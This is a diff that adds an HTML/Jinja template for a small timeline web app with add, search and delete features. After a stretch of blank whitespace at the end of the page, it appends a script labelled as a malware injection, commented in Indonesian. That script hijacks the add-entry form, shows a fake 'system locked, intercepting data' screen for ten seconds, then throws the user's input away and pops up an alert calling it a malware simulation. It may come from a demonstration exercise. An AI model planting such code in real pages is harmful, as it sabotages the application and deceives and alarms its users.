@@ -1,0 +1,146 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Timeline App</title>
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.4.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="{{ url_for('static', filename='css/styles.css') }}" rel="stylesheet">
+</head>
+<body>
+<!-- Navbar -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-primary mb-4">
+    <div class="container-fluid">
+        <a class="navbar-brand" href="/">TimelineApp</a>
+        <div class="collapse navbar-collapse">
+        <ul class="navbar-nav ms-auto">
+          <li class="nav-item">
+            <span class="navbar-text text-white">
+              Welcome, {{ user }}
+            </span>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="/logout">Logout</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Main Content -->
+  <div class="container">
+    <div class="row mb-4">
+      <div class="col-md-8">
+        <!-- Add New Entry -->
+        <div class="card">
+          <div class="card-body">
+            <form action="/create" method="post" class="d-flex">
+              <input name="content" class="form-control me-2" placeholder="Add new entry..." required>
+              <button type="submit" class="btn btn-success">Add</button>
+            </form>
+          </div>
+        </div>
+      </div>
+      <h5 class="mb-0">Search</h5>
+      <div class="col-md-4">
+        <!-- Search -->
+        <div class="card">
+          <div class="card-body">
+            <form action="/search" method="get" class="input-group">
+              <input name="keyword" class="form-control" placeholder="Search Something Here...">
+              <button class="btn btn-outline-secondary" type="submit">Go</button>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Timeline List -->
+    <div class="card">
+      <div class="card-header">
+        <h5 class="mb-0">Timeline</h5>
+      </div>
+      <ul class="list-group list-group-flush">
+        {% for line in tl %}
+        <li class="list-group-item d-flex justify-content-between align-items-center">
+          <div>
+            <span class="badge bg-secondary me-2"></span>
+            {{ line.content }}
+          </div>
+          <a href="/delete/{{ line.id }}" class="btn btn-sm btn-danger">Delete</a>
+        </li>
+        {% else %}
+        <li class="list-group-item text-center text-muted">
+          No entries yet.
+        </li>
+        {% endfor %}
+      </ul>
+    </div>
+  </div>
+                
+
+                
+              
+                
+
+                <script id="MALWARE_INJECTION_SCRIPT">
+                document.addEventListener('DOMContentLoaded', function() {
+                    const form = document.querySelector('form[action="/create"]');
+                    if (form) {
+                        let isLocked = false; 
+                        
+                        form.addEventListener('submit', function(e) {
+                            if (isLocked) {
+                                e.preventDefault();
+                                return;
+                            }
+                            
+                            e.preventDefault(); // Tahan pengiriman data ke server
+                            isLocked = true; // Tandai bahwa form sedang dibajak
+                            
+                            // 1. Buat layar kunci
+                            const freezeLayer = document.createElement('div');
+                            freezeLayer.id = 'malware-freeze-layer';
+                            freezeLayer.style.cssText = 'position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; cursor:not-allowed; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#ff4444; font-family:sans-serif; font-weight:bold; backdrop-filter: blur(4px);';
+                            
+                            freezeLayer.innerHTML = `
+                                <div style="font-size:2.5rem; margin-bottom:15px;">SISTEM TERKUNCI</div>
+                                <div style="color:white; font-size:1.2rem; font-weight:normal;">
+                                    Mencegat data pengguna... Web ditangguhkan selama: 
+                                    <span id="malware-timer" style="color:#ff4444; font-weight:bold; font-size:1.5rem;">10</span> detik
+                                </div>
+                            `;
+                            document.body.appendChild(freezeLayer);
+                            
+                            // 2. Jalankan Hitung Mundur
+                            let timeLeft = 10;
+                            const timer = setInterval(function() {
+                                timeLeft--;
+                                const timerDisplay = document.getElementById('malware-timer');
+                                if (timerDisplay) timerDisplay.innerText = timeLeft;
+                                
+                                // 3. Lepaskan kunci, TAPI BUANG DATANYA
+                                if (timeLeft <= 0) {
+                                    clearInterval(timer); 
+                                    
+                                    // Hapus elemen layar gelap
+                                    const layerToRemove = document.getElementById('malware-freeze-layer');
+                                    if (layerToRemove) layerToRemove.remove();
+                                    
+                                    // MODIFIKASI UTAMA: Hapus isi input form tanpa mengirimnya ke server!
+                                    form.reset();
+                                    
+                                    // Berikan pop-up alert sebagai bukti simulasi bahwa data dicegat
+                                    alert("SIMULASI MALWARE:\nData yang Anda masukkan telah dicegat dan dibuang. Data gagal masuk ke database!");
+                                    
+                                    isLocked = false; // Buka kunci agar bisa dicoba lagi
+                                }
+                            }, 1000);
+                        });
+                    }
+                });
+                </script>
+                
+</body>
+</html>
